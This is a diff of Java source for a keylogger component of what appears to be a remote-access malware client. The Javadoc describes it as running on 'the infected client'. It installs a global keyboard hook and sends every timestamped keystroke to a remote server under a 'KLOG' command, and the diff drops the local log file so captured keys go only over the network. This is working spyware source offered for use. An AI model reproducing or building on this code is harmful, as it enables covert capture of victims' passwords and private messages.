@@ -1,22 +1,35 @@
 package client;
 
-import java.io.FileWriter;
 import java.io.IOException;
-import java.io.PrintWriter;
 import java.sql.Timestamp;
 import java.text.SimpleDateFormat;
 
 import de.ksquared.system.keyboard.*;
 import tools.Connection;
 
+/**
+ * 
+ * Handles the key logging on the infected client.
+ * 
+ * @author Yohan Chalier
+ *
+ */
 public class KeyLogger extends Thread {
 
+	/**
+	 * Timestamp format
+	 */
 	private static final SimpleDateFormat SDF =
 			new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
 	
-	private static final String LOG_FILE = "keys.log";
-	
+	/**
+	 * The global listener, detecting events even out of Java's VM
+	 */
 	private static final GlobalKeyListener globalKeyListener;
+	
+	/**
+	 * Custom listener with implemented methods
+	 */
 	private static final KeyListener listener;
 	
 	static {
@@ -36,6 +49,9 @@ public class KeyLogger extends Thread {
 		};
 	}
 	
+	/**
+	 * A reference to the client to check for closure
+	 */
 	private static Client client;
 	
 	public KeyLogger(Client client) {
@@ -49,14 +65,20 @@ public class KeyLogger extends Thread {
 		
 		while (client.doLogKeyboard()) {
 			try {
-				Thread.sleep(1000);
+				Thread.sleep(100);
 			} catch (InterruptedException e) {}
 		}
 		
+		// Removing listener, or it would never stop
 		globalKeyListener.removeKeyListener(listener);
 		
 	}
 	
+	/**
+	 * Logs a key press and send it to the server
+	 * 
+	 * @param event The toString() representation of a KeyListener event
+	 */
 	private static void log(String event) {
 		
 		String timestamp = SDF.format(
@@ -66,19 +88,9 @@ public class KeyLogger extends Thread {
 			new Connection()
 				  .write("KLOG " + client.getClientId(), line.getBytes());
 		} catch (IOException e) {
-			// TODO Auto-generated catch block
+			// TODO Remove before production
 			e.printStackTrace();
 		}
-		append(line);
-	}
-	
-	private static void append(String event) {
-		try {
-			PrintWriter out = new PrintWriter(new FileWriter(LOG_FILE, true));
-			out.println(event);
-			out.close();
-			
-		} catch (IOException e) {}
 	}
 
 }
